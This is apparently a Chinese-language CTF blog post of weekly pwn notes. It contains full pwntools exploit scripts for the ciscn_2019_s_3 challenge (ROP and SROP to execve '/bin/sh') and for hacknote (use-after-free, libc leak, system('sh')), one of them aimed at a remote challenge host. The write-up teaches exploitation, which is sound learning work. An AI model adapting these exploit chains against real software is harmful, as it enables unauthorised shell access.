@@ -1,0 +1,448 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>第八周笔记 | Pdxbshx</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="ciscn_2019_s_3（系统调用）第一种解法：首先对程序进行分析：
+
+放入ida中反编译：
+
+
+仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。
+我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&amp;#x2F;bin&amp;#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为rax&amp;#x3D;&amp;#x3D;59，rdi&amp;#x3D;&amp;#x3D;’&amp;#x2F;bin&amp;#x2F;sh’，rsi&amp;#x3D;&amp;#x3D;0,  rdx&amp;#x3D;&amp;#x3D;0,  syscall."> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="第八周笔记"/>
+  <meta property="og:site_name" content="Pdxbshx"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Pdxbshx" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Pdxbshx</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 第八周笔记</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="ciscn-2019-s-3（系统调用）"><a href="#ciscn-2019-s-3（系统调用）" class="headerlink" title="ciscn_2019_s_3（系统调用）"></a>ciscn_2019_s_3（系统调用）</h1><h2 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h2><p>首先对程序进行分析：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-1.png"></p>
+<p>放入ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-2.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-3.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-4.png"></p>
+<p>仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。</p>
+<p>我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为rax&#x3D;&#x3D;59，rdi&#x3D;&#x3D;’&#x2F;bin&#x2F;sh’，rsi&#x3D;&#x3D;0,  rdx&#x3D;&#x3D;0,  syscall.</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-5.png"></p>
+<p>查看pop rdi的地址</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-6.png"></p>
+<p>然后我们可以调试一下程序，找到我们输入的&#x2F;bin&#x2F;sh的地址：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-7.png"></p>
+<p>我们可以分析得出栈基址为0x7fffffffe068,然后由此我们可以计算出输入的地址的偏移为e068-df20&#x3D;0x148，由此我们确定了&#x2F;bin&#x2F;sh的位置，也知道到了pop rdi指令的地址，然后我们需要使rdx&#x3D;&#x3D;0，但是我们并没有找到可以使pop rdx的指令，只有mov rdx , r13的指令，所以我们接着要对r13进行赋值，这里有个知识点需要注意，call【r12+rbx*8】当rbx&#x3D;0的时候就会 跳转到r12的位置，可以跳转到后面的rop继续执行</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-8.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-9.png"></p>
+<p>构造的脚本如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span>
+<span class="token comment">#p=remote('node4.buuoj.cn',29304)</span>
+vuln<span class="token operator">=</span><span class="token number">0x4004ed</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>
+pop_regs<span class="token operator">=</span><span class="token number">0x40059a</span>
+mov_addr<span class="token operator">=</span><span class="token number">0x400580</span>
+mov_rax<span class="token operator">=</span><span class="token number">0x4004e2</span>
+syscall<span class="token operator">=</span><span class="token number">0x400517</span>
+payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+binsh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span>
+payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_regs<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在本地打通的结果如下所示：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-10.png"></p>
+<p>需要注意的是我们在本地这里的&#x2F;bin&#x2F;sh的地址相对偏移是0x148，而在我们远地要想打通的话，得将0x148改成0x138或者是0x118，反正就是这两个一直在换，否则的话打不通。</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-11.png"></p>
+<h2 id="第二种解法："><a href="#第二种解法：" class="headerlink" title="第二种解法："></a>第二种解法：</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>这里简单介绍下SROP的概念，主要是帮助读者理解和使用pwntools提供的SigreturnFrame工具实现漏洞利用。</p>
+<p>  我们都知道ROP吧，即利用.text段中的gadgets，这些gadgets都以ret指令作为结尾，以此串联起来实现我们想要的系统调用进而达到获取目标主机shell的目的。那么如何判断是哪种系统调用呢？这里是根据寄存器的值来进行判断的，只要将相应的寄存器值设置为对应参数，然后执行syscall或者int 80指令就可以实现相应的函数功能。这里推荐一个实现系统调用如何设置寄存器对应参数的网站（<a target="_blank" rel="noopener" href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/%EF%BC%89%E5%92%8C%E4%B8%80%E4%B8%AA%E5%85%B7%E4%BD%93%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A%E8%AE%BE%E7%BD%AE%E5%AF%84%E5%AD%98%E5%99%A8%E5%AE%9E%E7%8E%B0execve%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%88https://blog.csdn.net/A951860555/article/details/110936441%EF%BC%89%E3%80%82">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/）和一个具体的例子：设置寄存器实现execve系统调用的博客（https://blog.csdn.net/A951860555/article/details/110936441）。</a></p>
+<p>  好了，究其本质，ROP方法的思路都是通过gadgets设置寄存器的值来实现漏洞利用的，SROP也是从属于ROP方法中的一员。它利用了Linux系统信号处理过程中的漏洞，即在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。sigreturn系统调用就是处理完后那一阶段执行的系统调用，它会读取当前栈空间中的数据作为寄存器的值。因此这里我们利用栈溢出漏洞和sigreturn系统调用就可以实现SROP的攻击方法。首先利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP&#x2F;ESP和RIP&#x2F;EIP都会被改变，所以SROP强大之处就是改变了所有的寄存器，这可以让我们实现任何想要的系统调用，但附带效果就是会改变栈顶指针RSP&#x2F;ESP，有时候这并不是我们想要的。</p>
+<h3 id="SigreturnFrame的使用"><a href="#SigreturnFrame的使用" class="headerlink" title="SigreturnFrame的使用"></a>SigreturnFrame的使用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># 64位</span>
+<span class="token comment"># sigreturn 代表可以触发sigreturn调用的地址</span>
+<span class="token comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span>
+<span class="token triple-quoted-string string">"""
+0x001 mov rax, 0Fh
+0x002 syscall
+0x003 ret
+"""</span>
+sigreturn <span class="token operator">=</span> <span class="token number">0x001</span>
+syscall <span class="token operator">=</span> <span class="token number">0x002</span>  <span class="token comment"># syscall gadget</span>
+
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> sh_addr  <span class="token comment"># "/bin/sh\x00"</span>
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
+
+pad <span class="token operator">=</span> padding <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>  <span class="token comment"># python3</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 32位注意以下几个方面</span>
+<span class="token comment"># 1、上下文初始化</span>
+<span class="token comment"># context.arch = "i386"</span>
+<span class="token comment"># frame = SigreturnFrame(kernel="i386")</span>
+<span class="token comment"># 2、frame.eax = xx  注意寄存器的名字</span>
+<span class="token comment"># 3、syscall指令在32位下可以找int 80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据葫芦画瓢，我们构造的exp如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span>
+sigreturn<span class="token operator">=</span><span class="token number">0x4004da</span> <span class="token comment">#mov rax,0fh</span>
+read_write<span class="token operator">=</span><span class="token number">0x4004f1</span>
+system_call<span class="token operator">=</span><span class="token number">0x400517</span> 
+payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_write<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+sh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span>
+frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rax<span class="token operator">=</span>constants<span class="token punctuation">.</span>SYS_execve
+frame<span class="token punctuation">.</span>rdi<span class="token operator">=</span>sh_addr
+frame<span class="token punctuation">.</span>rsi<span class="token operator">=</span><span class="token number">0</span>
+frame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0</span>
+frame<span class="token punctuation">.</span>rip<span class="token operator">=</span>system_call
+payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_call<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在本地打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-12.png"></p>
+<h2 id="有关系统调用的知识点"><a href="#有关系统调用的知识点" class="headerlink" title="有关系统调用的知识点"></a>有关系统调用的知识点</h2><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-13.png"></p>
+<h1 id="hacknote-UAF"><a href="#hacknote-UAF" class="headerlink" title="hacknote(UAF)"></a>hacknote(UAF)</h1><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>首先对程序进行检查：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-14.png"></p>
+<p>32位程序，开启了NX保护和canary保护，将程序放入ida中反编译：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-15.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-16.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-17.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-18.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-19.png"></p>
+<p> 仔细分析一下程序，发现其整个流程就是选择note，然后在其中进行写入内容，这里我们可以注意到在delete note这个函数中没有只释放了chunk，和chunk中的内容，并没有对指针进行释放，这就导致了uaf，我们之后再申请其他chunk的时候之前申请chunk的指针依然可以被使用，题目文件中给了一个libc库，利用这一点，我们就可以来获取我们的flag。</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-20.png"></p>
+<p>然后我们开始构造脚本攻击：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc_32.so.6'</span><span class="token punctuation">)</span>
+<span class="token comment">#p = process('./hacknote')</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">54690</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span>
+<span class="token comment">#context.log_level='debug'</span>
+<span class="token keyword">def</span> <span class="token function">addnote</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">delnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">printnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
+addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
+delnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+delnote<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+puts_plt<span class="token operator">=</span><span class="token number">0x804862B</span>
+puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
+printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+libc_base<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+delnote<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+payload2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'||sh'</span>
+addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
+printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里其实有个小细节，也是我做题过程中遇到的问题，后来还是仔细地检查了一遍程序才发现问题所在：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-21.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-22.png"></p>
+<p>在我们申请的chunk中，第一个默认的是puts_self函数，第二是我们填写到chunk里的内容，当我们进行print note的时候，会打印出以自身地址为参数的值，接着我们可以找到如下这个函数：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-23.png"></p>
+<p>可以运用这个函数打印出puts函数在got表中的地址，然后与libc库匹配，进而找到system函数！</p>
+<p>打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-24.png"></p>
+<h2 id="uaf介绍"><a href="#uaf介绍" class="headerlink" title="uaf介绍"></a>uaf介绍</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
+<p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p>
+<p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</p>
+<p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
+<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
+<h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/article/details/113919759">https://blog.csdn.net/weixin_45943522/article/details/113919759</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/539338507">https://zhuanlan.zhihu.com/p/539338507</a></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/uncategorized/第二次作业/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/系统调用/linux下的系统调用/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-11-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/系统调用-UAF/">系统调用,UAF<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/系统调用/">系统调用<span>2</span></a></li> <li><a href="/tags/UAF/">UAF<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ciscn-2019-s-3%EF%BC%88%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-article-text">ciscn_2019_s_3（系统调用）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-article-text">第一种解法：</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-article-text">第二种解法：</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SROP"><span class="toc-article-text">SROP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SigreturnFrame%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-article-text">SigreturnFrame的使用</span></a></li></ol></li><li class="toc-article-item 